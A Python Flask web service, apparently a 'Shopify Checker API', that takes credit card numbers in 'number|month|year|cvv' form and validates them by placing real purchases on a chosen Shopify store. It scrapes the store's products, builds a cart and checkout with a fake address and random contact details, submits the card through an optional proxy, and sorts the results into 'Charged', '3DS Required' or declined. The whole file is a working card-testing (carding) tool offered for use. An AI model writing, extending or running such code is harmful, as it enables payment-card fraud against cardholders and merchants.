from flask import Flask, request, jsonify
import requests
import random
import json
import re
import os
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════
DEFAULT_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
}

TIMEOUT = 25


# ═══════════════════════════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════════════════════════
@app.route('/')
def home():
    return jsonify({
        "status": True,
        "message": "Shopify Checker API v2",
        "endpoints": ["/shopify", "/health", "/products"]
    })


@app.route('/health')
def health():
    return jsonify({"status": True, "message": "OK", "time": time.time()})


@app.route('/shopify')
def shopify_check():
    """Main CC check endpoint"""
    try:
        site = request.args.get('site', '').strip()
        cc = request.args.get('cc', '').strip()
        proxy = request.args.get('proxy', '').strip()

        # Validate
        if not site or not cc:
            return jsonify({
                "Status": False,
                "Response": "Missing params: site, cc",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            })

        if '|' not in cc:
            return jsonify({
                "Status": False,
                "Response": "Invalid CC format",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            })

        # Normalize site
        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        site = site.split('/')[0]  # Remove path

        if '.' not in site:
            return jsonify({
                "Status": False,
                "Response": "Invalid site URL",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            })

        # Check card
        result = check_shopify(site, cc, proxy)
        return jsonify(result)

    except Exception as e:
        return jsonify({
            "Status": False,
            "Response": f"Error: {str(e)[:100]}",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        })


@app.route('/products')
def get_products():
    """Site ke products fetch karo"""
    try:
        site = request.args.get('site', '').strip()
        if not site:
            return jsonify({"status": False, "error": "Missing site"})

        site = site.replace('https://', '').replace('http://', '').rstrip('/')
        site = site.split('/')[0]

        products = fetch_products(site)

        return jsonify({
            "status": True if products else False,
            "site": site,
            "count": len(products),
            "products": products[:30]
        })
    except Exception as e:
        return jsonify({"status": False, "error": str(e)[:100]})


# ═══════════════════════════════════════════════════════════
# SESSION
# ═══════════════════════════════════════════════════════════
def get_session(proxy=None):
    """Session with headers"""
    s = requests.Session()
    s.headers.update(DEFAULT_HEADERS)
    s.verify = False
    if proxy and proxy not in ('test', 'no', ''):
        try:
            if '://' not in proxy:
                proxy = 'http://' + proxy
            s.proxies = {'http': proxy, 'https': proxy}
        except:
            pass
    return s


# ═══════════════════════════════════════════════════════════
# FETCH PRODUCTS — MULTIPLE METHODS
# ═══════════════════════════════════════════════════════════
def fetch_products(site):
    """Shopify site se products fetch karo — 4 methods"""
    products = []
    s = get_session()

    # ═══════════════════════════════════════
    # METHOD 1: /products.json
    # ═══════════════════════════════════════
    try:
        r = s.get(f'https://{site}/products.json?limit=250', timeout=TIMEOUT)
        if r.status_code == 200:
            try:
                data = r.json()
                for p in data.get('products', []):
                    for v in p.get('variants', []):
                        if v.get('id'):
                            products.append({
                                'title': p.get('title', ''),
                                'variant_id': v.get('id'),
                                'price': str(v.get('price', '1.00')),
                                'available': v.get('available', False),
                                'requires_shipping': v.get('requires_shipping', True),
                            })
                if products:
                    print(f"✅ Method 1 (/products.json): {len(products)} products from {site}")
                    return products
            except Exception as e:
                print(f"Method 1 parse err: {e}")
    except Exception as e:
        print(f"Method 1 err: {e}")

    # ═══════════════════════════════════════
    # METHOD 2: /collections/all/products.json
    # ═══════════════════════════════════════
    try:
        r = s.get(f'https://{site}/collections/all/products.json?limit=250', timeout=TIMEOUT)
        if r.status_code == 200:
            try:
                data = r.json()
                for p in data.get('products', []):
                    for v in p.get('variants', []):
                        if v.get('id'):
                            products.append({
                                'title': p.get('title', ''),
                                'variant_id': v.get('id'),
                                'price': str(v.get('price', '1.00')),
                                'available': v.get('available', False),
                                'requires_shipping': v.get('requires_shipping', True),
                            })
                if products:
                    print(f"✅ Method 2 (/collections/all): {len(products)} products from {site}")
                    return products
            except Exception as e:
                print(f"Method 2 parse err: {e}")
    except Exception as e:
        print(f"Method 2 err: {e}")

    # ═══════════════════════════════════════
    # METHOD 3: Homepage + /products/{handle}.js
    # ═══════════════════════════════════════
    try:
        r = s.get(f'https://{site}', timeout=TIMEOUT)
        if r.status_code == 200:
            # Product handles regex
            handles = re.findall(r'/products/([a-zA-Z0-9\-_]+)', r.text)
            handles = list(set(handles))[:30]  # unique, max 30
            print(f"Method 3: found {len(handles)} handles")

            for handle in handles:
                try:
                    rp = s.get(f'https://{site}/products/{handle}.js', timeout=10)
                    if rp.status_code == 200:
                        pdata = rp.json()
                        for v in pdata.get('variants', []):
                            if v.get('id'):
                                price_val = v.get('price', 100)
                                # Shopify .js returns price in cents
                                if isinstance(price_val, int) and price_val > 100:
                                    price_val = price_val / 100
                                products.append({
                                    'title': pdata.get('title', ''),
                                    'variant_id': v.get('id'),
                                    'price': str(price_val),
                                    'available': v.get('available', True),
                                    'requires_shipping': v.get('requires_shipping', True),
                                })
                except:
                    continue

            if products:
                print(f"✅ Method 3 (handles): {len(products)} products from {site}")
                return products
    except Exception as e:
        print(f"Method 3 err: {e}")

    # ═══════════════════════════════════════
    # METHOD 4: Sitemap
    # ═══════════════════════════════════════
    try:
        r = s.get(f'https://{site}/sitemap.xml', timeout=TIMEOUT)
        if r.status_code == 200:
            # Find products sitemap
            sm_match = re.search(r'<loc>([^<]*sitemap_products[^<]*)</loc>', r.text)
            sitemap_url = sm_match.group(1) if sm_match else f'https://{site}/sitemap_products_1.xml'

            r2 = s.get(sitemap_url, timeout=TIMEOUT)
            if r2.status_code == 200:
                urls = re.findall(r'<loc>([^<]+/products/[^<]+)</loc>', r2.text)
                print(f"Method 4: {len(urls)} product URLs in sitemap")

                for url in urls[:20]:
                    try:
                        handle = url.split('/products/')[-1].split('?')[0].rstrip('/')
                        rp = s.get(f'https://{site}/products/{handle}.js', timeout=10)
                        if rp.status_code == 200:
                            pdata = rp.json()
                            for v in pdata.get('variants', []):
                                if v.get('id'):
                                    price_val = v.get('price', 100)
                                    if isinstance(price_val, int) and price_val > 100:
                                        price_val = price_val / 100
                                    products.append({
                                        'title': pdata.get('title', ''),
                                        'variant_id': v.get('id'),
                                        'price': str(price_val),
                                        'available': v.get('available', True),
                                        'requires_shipping': v.get('requires_shipping', True),
                                    })
                    except:
                        continue

                if products:
                    print(f"✅ Method 4 (sitemap): {len(products)} products from {site}")
                    return products
    except Exception as e:
        print(f"Method 4 err: {e}")

    print(f"❌ NO PRODUCTS FOUND for {site}")
    return products


# ═══════════════════════════════════════════════════════════
# CHECK SHOPIFY — MAIN LOGIC
# ═══════════════════════════════════════════════════════════
def check_shopify(site, cc, proxy):
    """
    Main Shopify CC checking flow:
    1. Products fetch
    2. Cart create
    3. Checkout token
    4. Address add
    5. Payment submit
    6. Response parse
    """
    try:
        parts = cc.split('|')
        if len(parts) != 4:
            return {
                "Status": False,
                "Response": "Invalid CC: " + cc[:20],
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            }

        card_num, month, year, cvv = parts
        # Normalize
        if len(year) == 2:
            year = '20' + year
        month = month.zfill(2)
        cvv = cvv.strip()
        card_num = card_num.strip().replace(' ', '')

        s = get_session(proxy)

        # ═══════════════════════════════════════
        # STEP 1: Products fetch
        # ═══════════════════════════════════════
        products = fetch_products(site)
        if not products:
            return {
                "Status": False,
                "Response": "No products available",
                "Price": "0.00",
                "Gateway": "Auto Shopify"
            }

        # Random product select
        product = random.choice(products)
        variant_id = product.get('variant_id')
        price = product.get('price', '1.00')

        if not variant_id:
            return {
                "Status": False,
                "Response": "Variant ID missing",
                "Price": price,
                "Gateway": "Auto Shopify"
            }

        # ═══════════════════════════════════════
        # STEP 2: Cart create
        # ═══════════════════════════════════════
        cart_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': f'https://{site}',
            'Referer': f'https://{site}/',
            'X-Requested-With': 'XMLHttpRequest',
        }
        s.headers.update(cart_headers)

        token = None

        # Method A: /cart/add.js
        try:
            cart_data = {'id': int(variant_id), 'quantity': 1}
            r_cart = s.post(f'https://{site}/cart/add.js', json=cart_data, timeout=TIMEOUT)
            if r_cart.status_code in (200, 201):
                try:
                    cart_resp = r_cart.json()
                    token = cart_resp.get('token')
                except:
                    pass
                # Fallback: /cart.js
                if not token:
                    try:
                        r_cartjs = s.get(f'https://{site}/cart.js', timeout=TIMEOUT)
                        if r_cartjs.status_code == 200:
                            token = r_cartjs.json().get('token')
                    except:
                        pass
        except Exception as e:
            print(f"Cart method A err: {e}")

        # Method B: /wallets/checkouts.json
        if not token:
            try:
                checkout_data = {
                    "checkout": {
                        "line_items": [{"variant_id": int(variant_id), "quantity": 1}]
                    }
                }
                r_co = s.post(
                    f'https://{site}/wallets/checkouts.json',
                    json=checkout_data,
                    timeout=TIMEOUT
                )
                if r_co.status_code in (200, 201):
                    try:
                        token = r_co.json().get('checkout', {}).get('token')
                    except:
                        pass
            except Exception as e:
                print(f"Cart method B err: {e}")

        if not token:
            return {
                "Status": False,
                "Response": "Cart creation failed",
                "Price": price,
                "Gateway": "Auto Shopify"
            }

        # ═══════════════════════════════════════
        # STEP 3: Address add
        # ═══════════════════════════════════════
        rand_phone = "+1" + str(random.randint(2000000000, 9999999999))
        rand_email = f"user{random.randint(10000, 99999)}@gmail.com"

        address = {
            "first_name": "John",
            "last_name": "Smith",
            "address1": "123 Main Street",
            "address2": "Apt 4B",
            "city": "New York",
            "province": "New York",
            "province_code": "NY",
            "country": "United States",
            "country_code": "US",
            "zip": "10001",
            "phone": rand_phone,
        }

        checkout_update = {
            "checkout": {
                "email": rand_email,
                "shipping_address": address,
                "billing_address": address,
            }
        }

        try:
            s.put(
                f'https://{site}/wallets/checkouts/{token}.json',
                json=checkout_update,
                timeout=TIMEOUT
            )
        except Exception as e:
            print(f"Address update err: {e}")

        # Shipping line
        try:
            shipping_data = {"checkout": {"shipping_line": {"handle": "standard"}}}
            s.put(
                f'https://{site}/wallets/checkouts/{token}.json',
                json=shipping_data,
                timeout=TIMEOUT
            )
        except:
            pass

        # ═══════════════════════════════════════
        # STEP 4: Payment submit
        # ═══════════════════════════════════════
        payment_data = {
            "payment": {
                "credit_card": {
                    "number": card_num,
                    "month": month,
                    "year": year,
                    "verification_value": cvv,
                    "first_name": address["first_name"],
                    "last_name": address["last_name"],
                },
                "amount": price,
                "currency": "USD",
            }
        }

        r_pay = s.post(
            f'https://{site}/checkouts/{token}/payment',
            json=payment_data,
            timeout=TIMEOUT
        )

        # ═══════════════════════════════════════
        # STEP 5: Parse response
        # ═══════════════════════════════════════
        raw_text = r_pay.text or ''
        raw_lower = raw_text.lower()

        dead_keywords = [
            'card_declined', 'declined', 'insufficient_funds', 'do_not_honor',
            'expired_card', 'incorrect_cvv', 'incorrect_number', 'invalid_card',
            'stolen_card', 'lost_card', 'pickup_card', 'restricted_card',
            'generic_decline', 'fraudulent', 'not_permitted', 'card_velocity_exceeded',
            'payment_method_not_available', 'processing_error',
            'cvv_failure', 'transaction_not_allowed', 'invalid_expiry',
            'invalid_cvc', 'invalid_cvv',
        ]

        charged_keywords = [
            'charged', 'order_completed', 'order_placed', 'order_paid',
            'payment_successful', 'thank_you', 'success',
        ]

        threeds_keywords = [
            'requires_action', '3d_secure', '3ds', 'authentication_required',
            'challenge_required', '3dsecure', 'redirect_url',
        ]

        # JSON parse
        try:
            resp_json = r_pay.json()
            resp_str = json.dumps(resp_json)
            resp_lower_json = resp_str.lower()

            payment = resp_json.get('payment', {})
            if isinstance(payment, dict):
                status = str(payment.get('status', '')).lower()
                err_msg = payment.get('payment_processing_error_message', '') or ''
                err_msg = str(err_msg)

                # CHARGED
                if status in ('success', 'completed', 'authorized', 'captured', 'paid'):
                    return {
                        "Status": True,
                        "Response": f"Charged ${price} ✓",
                        "Price": price,
                        "Gateway": "Auto Shopify",
                        "Site": site,
                    }

                # 3DS
                if 'requires_action' in status or '3d' in err_msg.lower():
                    return {
                        "Status": False,
                        "Response": f"3DS Required: {err_msg[:80]}",
                        "Price": price,
                        "Gateway": "Auto Shopify",
                    }

                # DEAD with message
                if err_msg:
                    return {
                        "Status": False,
                        "Response": err_msg[:120],
                        "Price": price,
                        "Gateway": "Auto Shopify",
                    }

            # Generic keyword check
            if any(k in resp_lower_json for k in charged_keywords):
                return {
                    "Status": True,
                    "Response": f"Charged ${price} ✓",
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

            if any(k in resp_lower_json for k in dead_keywords):
                return {
                    "Status": False,
                    "Response": resp_str[:120],
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

            if any(k in resp_lower_json for k in threeds_keywords):
                return {
                    "Status": False,
                    "Response": "3DS Required",
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

            # Fallback
            if resp_json.get('message'):
                return {
                    "Status": False,
                    "Response": str(resp_json.get('message'))[:120],
                    "Price": price,
                    "Gateway": "Auto Shopify",
                }

        except Exception as e:
            print(f"JSON parse err: {e}")

        # Text-based fallback
        if any(k in raw_lower for k in charged_keywords):
            return {
                "Status": True,
                "Response": f"Charged ${price} ✓",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        if any(k in raw_lower for k in dead_keywords):
            return {
                "Status": False,
                "Response": raw_text[:120],
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        # HTTP status codes
        if r_pay.status_code == 402:
            return {
                "Status": False,
                "Response": "Card Declined (402)",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        if r_pay.status_code == 200:
            return {
                "Status": True,
                "Response": f"Charged ${price} ✓",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        if r_pay.status_code == 422:
            return {
                "Status": False,
                "Response": raw_text[:120] or "Unprocessable",
                "Price": price,
                "Gateway": "Auto Shopify",
            }

        return {
            "Status": False,
            "Response": f"HTTP {r_pay.status_code}: {raw_text[:80]}",
            "Price": price,
            "Gateway": "Auto Shopify",
        }

    except requests.Timeout:
        return {
            "Status": False,
            "Response": "Timeout",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        }
    except requests.ConnectionError:
        return {
            "Status": False,
            "Response": "Connection error",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        }
    except Exception as e:
        return {
            "Status": False,
            "Response": f"Error: {str(e)[:100]}",
            "Price": "0.00",
            "Gateway": "Auto Shopify"
        }


# ═══════════════════════════════════════════════════════════
# RUN
# ═══════════════════════════════════════════════════════════
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
